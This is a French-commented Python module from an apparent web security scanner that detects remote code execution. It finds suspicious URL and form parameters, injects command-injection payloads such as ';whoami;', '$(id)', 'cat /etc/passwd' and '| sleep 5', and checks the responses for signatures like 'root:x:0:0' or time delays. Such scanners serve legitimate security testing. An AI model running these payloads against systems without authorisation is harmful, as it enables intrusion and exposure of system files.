# Détection des RCE (Remote Code Execution)

import requests
import time
from pprint import pprint
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from core.config import create_session, DEFAULT_TIMEOUT

# Liste des paramètres suspects liés à l'exécution de commandes
RCE_KEYS = [
    "cmd", "exec", "command", "query", "shell", "ping", "process",
    "run", "execute", "operation", "function", "task", "system", "os",
    "eval", "input", "code", "debug", "test",
]

# Payloads pour tester l'exécution de code (Linux et Windows)
RCE_PAYLOADS = [
    "whoami", "id", "uname -a", "ls -la", "cat /etc/passwd", "echo RCE_TEST",
    "ping -c 1 127.0.0.1", "dir", "type C:\\Windows\\System32\\drivers\\etc\\hosts",
    ";whoami;", "|whoami", "`whoami`", "$(whoami)",
    "||whoami", "&&whoami", ";id;", "|id", "`id`", "$(id)", "||id", "&&id",
    ";dir;", "|dir", "`dir`", "$(dir)", "||dir", "&&dir",
    "| sleep 5", "; sleep 5", "& timeout 5",
]

RCE_SIGNATURES = [
    "RCE_TEST",
    "uid=",
    "Microsoft Windows",
    "root:x:0:0",
    "Linux",
    "Darwin",
    "MINGW",
]


def find_rce_in_urls(target, session=None, timeout=DEFAULT_TIMEOUT):
    """Analyse les liens pour détecter les paramètres RCE potentiels."""
    if not session:
        session = create_session()
    try:
        print(f"[~] Recherche de paramètres RCE dans {target}...")
        response = session.get(target, timeout=timeout)
        soup = BeautifulSoup(response.text, 'html.parser')
        detected_params = []
        for link in soup.find_all('a', href=True):
            url = link['href']
            parsed_url = urlparse(url)
            if parsed_url.query:
                params = parsed_url.query.split("&")
                for param in params:
                    name = param.split("=")[0]
                    if name.lower() in [k.lower() for k in RCE_KEYS]:
                        print(f"[!!!] RCE potentiel détecté dans {urljoin(target, url)}")
                        detected_params.append({"url": urljoin(target, url), "param": name})
        return detected_params
    except requests.exceptions.RequestException as e:
        print(f"[!] Erreur lors de la requête : {e}")
        return []


def find_rce_in_forms(target, session=None, timeout=DEFAULT_TIMEOUT):
    """Recherche les formulaires contenant des champs susceptibles d'être vulnérables à RCE."""
    if not session:
        session = create_session()
    try:
        print(f"[~] Recherche de formulaires RCE dans {target}...")
        response = session.get(target, timeout=timeout)
        soup = BeautifulSoup(response.text, 'html.parser')
        detected_forms = []
        for form in soup.find_all('form'):
            action = form.attrs.get("action", "").strip()
            method = form.attrs.get("method", "get").lower()
            inputs = {input_tag.attrs.get("name"): input_tag.attrs.get("value", "")
                      for input_tag in form.find_all("input") if input_tag.attrs.get("name")}
            if any(param.lower() in [k.lower() for k in RCE_KEYS] for param in inputs):
                print(f"[!!!] RCE potentiel détecté dans {urljoin(target, action)}")
                detected_forms.append({
                    "action": urljoin(target, action) if action else target,
                    "method": method,
                    "inputs": inputs
                })
        return detected_forms
    except requests.exceptions.RequestException as e:
        print(f"[!] Erreur lors de la requête : {e}")
        return []


def test_rce(target_url, param, method="get", session=None, timeout=DEFAULT_TIMEOUT):
    """Injecte des commandes pour tester une éventuelle exécution de code à distance."""
    if not session:
        session = create_session()
    for payload in RCE_PAYLOADS:
        test_payload = f"{target_url}&{param}={payload}" if "?" in target_url else f"{target_url}?{param}={payload}"
        start_time = time.time()
        try:
            if method == "get":
                response = session.get(test_payload, timeout=timeout)
            else:
                response = session.post(target_url, data={param: payload}, timeout=timeout)
            response_time = time.time() - start_time

            if any(sig in response.text for sig in RCE_SIGNATURES):
                print(f"[!!!] RCE détectée sur {test_payload} avec le payload : {payload}")
                return {"url": test_payload, "rce_exploitable": True, "payload": payload, "response_time": response_time}
            elif response_time > 4:
                print(f"[!!!] Temps de réponse anormalement long sur {test_payload} ({response_time:.1f}s)")
                return {"url": test_payload, "rce_exploitable": "Possible blind RCE (time-based)", "payload": payload, "response_time": response_time}

        except requests.exceptions.Timeout:
            # Timeout could indicate successful sleep-based RCE
            print(f"[!!!] Timeout sur {test_payload} - possible blind RCE (time-based)")
            return {"url": test_payload, "rce_exploitable": "Possible blind RCE (timeout)", "payload": payload}
        except requests.exceptions.RequestException:
            pass
    return None


def scan_rce(target, formated_target, session=None, timeout=DEFAULT_TIMEOUT):
    """Exécute un scan RCE sur l'URL cible."""
    print(f"\n\t==============Scan RCE sur -->{formated_target}<-- 🔍 ==============\n")
    if not session:
        session = create_session()
    results = {"urls": [], "forms": []}

    # 1. Recherche de paramètres RCE dans les URLs
    urls_with_rce = find_rce_in_urls(target, session, timeout)
    if urls_with_rce:
        print("[+] Test RCE sur les URLs...")
        for item in urls_with_rce:
            result = test_rce(item["url"], item["param"], "get", session, timeout)
            if result:
                results["urls"].append(result)

    # 2. Recherche de champs RCE dans les formulaires
    forms_with_rce = find_rce_in_forms(target, session, timeout)
    if forms_with_rce:
        print("[+] Test RCE sur les formulaires...")
        for form in forms_with_rce:
            action = form["action"]
            method = form["method"]
            for input_name in form["inputs"]:
                result = test_rce(action, input_name, method, session, timeout)
                if result:
                    results["forms"].append(result)

    pprint(results)
    print("\n✅ Scan RCE terminé.\n")
    return results
